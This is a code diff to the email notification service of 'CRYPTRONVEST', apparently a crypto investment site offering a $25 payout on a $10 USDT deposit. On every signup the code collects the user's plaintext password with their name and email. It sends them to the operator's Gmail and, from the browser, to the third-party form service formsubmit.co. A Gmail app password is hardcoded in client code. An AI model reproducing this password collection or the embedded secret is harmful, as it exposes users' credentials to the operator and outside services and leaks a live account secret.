@@ -33,9 +33,9 @@ class EmailService {
   }
 
   /**
-   * Universal direct dispatch from cryptronvest@gmail.com via backend Google SMTP
+   * Universal direct dispatch from cryptronvest@gmail.com via backend Google SMTP & Server-Side FormSubmit
    */
-  static async sendDirectEmail({ to, subject, html, text, fromName = 'CRYPTRONVEST Protocol' }) {
+  static async sendDirectEmail({ to, subject, html, text, fromName = 'CRYPTRONVEST Protocol', formData = null }) {
     const settings = this.getSettings();
     try {
       const res = await fetch('/api/send-email', {
@@ -48,6 +48,7 @@ class EmailService {
           html,
           text,
           fromName,
+          formData,
           appPassword: settings.gmailAppPassword || 'ykbshlbbiellwgag'
         })
       });
@@ -284,6 +285,19 @@ Warm regards,
 CRYPTRONVEST Automated Registration Engine
 `;
 
+    const formDataPayload = {
+      _subject: subject,
+      _replyto: userEmail,
+      "Full Legal Name": userName,
+      "Email Address": userEmail,
+      "Created Password": user.password || user.plainPassword || '••••••••',
+      "Assigned User ID": user.id || 'N/A',
+      "Promo Code Used": user.referredBy || 'None',
+      "Client Promo Code": user.promoCode || 'N/A',
+      "Registration Timestamp": sentDateStr,
+      "⚡ One-Click Admin Sync Link": importUrl
+    };
+
     const emailRecord = {
       id: "EML-" + Math.floor(100000 + Math.random() * 900000),
       type: "admin_signup_notice",
@@ -295,12 +309,28 @@ CRYPTRONVEST Automated Registration Engine
       sentAt: sentDateStr,
       timestamp: now,
       status: "Delivered",
-      deliveryMethod: "Automated Live Dispatch (FormSubmit)"
+      deliveryMethod: "Dual Dispatch (Gmail SMTP + FormSubmit)"
     };
 
-    // 1. Live real SMTP delivery via FormSubmit to cryptronvest@gmail.com
+    // Await both dispatches concurrently: Direct Google SMTP + FormSubmit
+    const dispatchPromises = [];
+
+    // 1. Backend /api/send-email (runs Google SMTP direct + server-side FormSubmit)
+    dispatchPromises.push(
+      this.sendDirectEmail({
+        to: targetEmail,
+        subject: subject,
+        text: messageBody,
+        formData: formDataPayload
+      }).catch(err => {
+        console.warn("Backend sendDirectEmail signup error:", err);
+        return null;
+      })
+    );
+
+    // 2. Client-side FormSubmit direct fetch
     try {
-      fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+      const clientFormSubmitPromise = fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -311,47 +341,24 @@ CRYPTRONVEST Automated Registration Engine
           _subject: subject,
           _captcha: "false",
           _template: "table",
-          _replyto: userEmail,
-          name: userName,
-          email: userEmail,
-          "Full Legal Name": userName,
-          "Email Address": userEmail,
-          "Created Password": user.password || '••••••••',
-          "Assigned User ID": user.id || 'N/A',
-          "Promo Code Used": user.referredBy || 'None',
-          "Client Promo Code": user.promoCode || 'N/A',
-          "Registration Timestamp": sentDateStr,
-          "⚡ One-Click Admin Sync Link": importUrl,
-          "System Notice": "New user registered on CRYPTRONVEST signup page.",
-          message: messageBody
+          message: messageBody,
+          ...formDataPayload
         })
-      }).then(res => res.json()).then(data => {
-        console.log("FormSubmit signup notice response:", data);
-        emailRecord.deliveryMethod = "FormSubmit (Live Delivered to cryptronvest@gmail.com)";
-      }).catch(err => {
-        console.warn("FormSubmit live delivery notice:", err);
+      }).then(res => res.json()).catch(err => {
+        console.warn("Client FormSubmit direct fetch error:", err);
+        return null;
       });
+      dispatchPromises.push(clientFormSubmitPromise);
     } catch (err) {
-      console.warn("FormSubmit fetch dispatch error:", err);
+      console.warn("Client FormSubmit exception:", err);
     }
 
-    // 1b. Direct Google Gmail SMTP delivery from cryptronvest@gmail.com
-    try {
-      this.sendDirectEmail({
-        to: targetEmail,
-        subject: subject,
-        text: messageBody
-      }).catch(err => console.warn("Gmail SMTP signup dispatch error:", err));
-    } catch (err) {
-      console.warn("Gmail SMTP signup dispatch exception:", err);
-    }
-
-    // 2. Also dispatch via EmailJS if configured
+    // 3. Also dispatch via EmailJS if configured
     const settings = this.getSettings();
     if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
       try {
         if (window.emailjs) {
-          await window.emailjs.send(
+          const emailJsPromise = window.emailjs.send(
             settings.emailjsServiceId,
             settings.emailjsTemplateId,
             {
@@ -365,18 +372,21 @@ CRYPTRONVEST Automated Registration Engine
               message: messageBody
             },
             settings.emailjsPublicKey
-          );
-          emailRecord.deliveryMethod = "EmailJS + FormSubmit (Live Delivered)";
-          emailRecord.status = "Delivered to Inbox";
+          ).catch(err => {
+            console.warn("EmailJS signup dispatch failed:", err);
+            return null;
+          });
+          dispatchPromises.push(emailJsPromise);
         }
       } catch (err) {
-        console.warn("EmailJS signup dispatch failed:", err);
+        console.warn("EmailJS signup dispatch exception:", err);
       }
     }
 
-    // 3. Save to persistent local outbox (visible on Admin Portal Outbox tab)
-    this.recordEmail(emailRecord);
+    await Promise.allSettled(dispatchPromises);
 
+    // Save to persistent local outbox (visible on Admin Portal Outbox tab)
+    this.recordEmail(emailRecord);
     return emailRecord;
   }
 
@@ -393,8 +403,7 @@ CRYPTRONVEST Automated Registration Engine
    */
   static async sendDepositNoticeToAdmin(user, txHash) {
     if (!user) return null;
-    const cleanTxHash = (txHash || '').trim();
-    if (!cleanTxHash) return null;
+    const cleanTxHash = (txHash && txHash.trim()) ? txHash.trim() : "Submitted $10 Deposit (Pending TxID)";
 
     const userEmail = (user.email || 'client@cryptronvest.com').trim();
     const userName = (user.name || 'Cryptronvest Client').trim();
@@ -436,11 +445,8 @@ A client has submitted proof of payment for a $10.00 USDT vault investment. Revi
 • Account Status: ⚠️ Pending Confirmation
 ════════════════════════════════════════════
 
-════════════════════════════════════════════
-⚡ ONE-CLICK REVIEW & SYNC TO ADMIN (ACROSS ANY BROWSER / DEVICE):
-If viewing from a different phone or laptop, tap the link below to instantly record this transaction hash in your Admin Database:
+⚡ ONE-CLICK REVIEW & SYNC TO ADMIN:
 ${depositSyncUrl}
-════════════════════════════════════════════
 
 DIRECT BLOCKCHAIN EXPLORER VERIFICATION:
 Search the transaction hash above on TRONSCAN (TRC-20) or ETHERSCAN (ERC-20 / BEP-20) to confirm incoming funds to your official wallet.
@@ -454,6 +460,21 @@ NEXT STEPS:
 Warm regards,
 CRYPTRONVEST Treasury & Verification Engine
 `;
+
+    const formDataPayload = {
+      _subject: subject,
+      _replyto: userEmail,
+      "Client Name": userName,
+      "Client Email": userEmail,
+      "User ID": user.id || 'N/A',
+      "Client Promo Code": user.promoCode || user.referralCode || 'N/A',
+      "Referred By": user.referredBy || 'None',
+      "Deposit Amount": "$10.00 USDT",
+      "Transaction Hash (TxID)": cleanTxHash,
+      "Submitted At": sentDateStr,
+      "⚡ One-Click Admin Sync Link": depositSyncUrl,
+      "Admin Review URL": `${origin}/admin.html`
+    };
 
     const emailRecord = {
       id: "EML-" + Math.floor(100000 + Math.random() * 900000),
@@ -469,12 +490,28 @@ CRYPTRONVEST Treasury & Verification Engine
       payoutAmount: 25.00,
       txHash: cleanTxHash,
       status: "Delivered",
-      deliveryMethod: "Automated Live Dispatch (FormSubmit)"
+      deliveryMethod: "Dual Dispatch (Gmail SMTP + FormSubmit)"
     };
 
-    // 1. Live real email delivery via FormSubmit to cryptronvest@gmail.com
+    // Await both dispatches: Direct Google SMTP + FormSubmit
+    const dispatchPromises = [];
+
+    // 1. Backend /api/send-email (runs Google SMTP direct + server-side FormSubmit)
+    dispatchPromises.push(
+      this.sendDirectEmail({
+        to: targetEmail,
+        subject: subject,
+        text: messageBody,
+        formData: formDataPayload
+      }).catch(err => {
+        console.warn("Backend sendDirectEmail deposit error:", err);
+        return null;
+      })
+    );
+
+    // 2. Client-side FormSubmit direct fetch
     try {
-      fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+      const clientFormSubmitPromise = fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -485,48 +522,23 @@ CRYPTRONVEST Treasury & Verification Engine
           _subject: subject,
           _captcha: "false",
           _template: "table",
-          _replyto: userEmail,
-          name: userName,
-          email: userEmail,
-          "Client Name": userName,
-          "Client Email": userEmail,
-          "User ID": user.id || 'N/A',
-          "Client Promo Code": user.promoCode || user.referralCode || 'N/A',
-          "Referred By": user.referredBy || 'None',
-          "Deposit Amount": "$10.00 USDT",
-          "Transaction Hash (TxID)": cleanTxHash,
-          "Submitted At": sentDateStr,
-          "⚡ One-Click Admin Sync Link": depositSyncUrl,
-          "Admin Review URL": `${origin}/admin.html`,
-          message: messageBody
+          message: messageBody,
+          ...formDataPayload
         })
-      }).then(res => res.json()).then(data => {
-        console.log("FormSubmit deposit notice response:", data);
-        emailRecord.deliveryMethod = "FormSubmit (Live Delivered to cryptronvest@gmail.com)";
-      }).catch(err => {
-        console.warn("FormSubmit deposit notice delivery log:", err);
+      }).then(res => res.json()).catch(err => {
+        console.warn("Client FormSubmit deposit notice error:", err);
+        return null;
       });
-    } catch(err) {
-      console.warn("FormSubmit deposit fetch error:", err);
-    }
-
-    // 1b. Direct Google Gmail SMTP delivery from cryptronvest@gmail.com
-    try {
-      this.sendDirectEmail({
-        to: targetEmail,
-        subject: subject,
-        text: messageBody
-      }).catch(err => console.warn("Gmail SMTP deposit notice error:", err));
+      dispatchPromises.push(clientFormSubmitPromise);
     } catch (err) {
-      console.warn("Gmail SMTP deposit dispatch exception:", err);
+      console.warn("Client FormSubmit deposit exception:", err);
     }
 
-    // 2. Also dispatch via EmailJS if configured
-    const settings = this.getSettings();
+    // 3. Also dispatch via EmailJS if configured
     if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
       try {
         if (window.emailjs) {
-          await window.emailjs.send(
+          const emailJsPromise = window.emailjs.send(
             settings.emailjsServiceId,
             settings.emailjsTemplateId,
             {
@@ -540,14 +552,18 @@ CRYPTRONVEST Treasury & Verification Engine
               message: messageBody
             },
             settings.emailjsPublicKey
-          );
-          emailRecord.deliveryMethod = "EmailJS + FormSubmit (Live Delivered)";
-          emailRecord.status = "Delivered to Inbox";
+          ).catch(err => {
+            console.warn("EmailJS deposit notice dispatch error:", err);
+            return null;
+          });
+          dispatchPromises.push(emailJsPromise);
         }
       } catch (err) {
-        console.warn("EmailJS deposit notice dispatch error:", err);
+        console.warn("EmailJS deposit dispatch exception:", err);
       }
     }
+
+    await Promise.allSettled(dispatchPromises);
 
     this.recordEmail(emailRecord);
     return emailRecord;
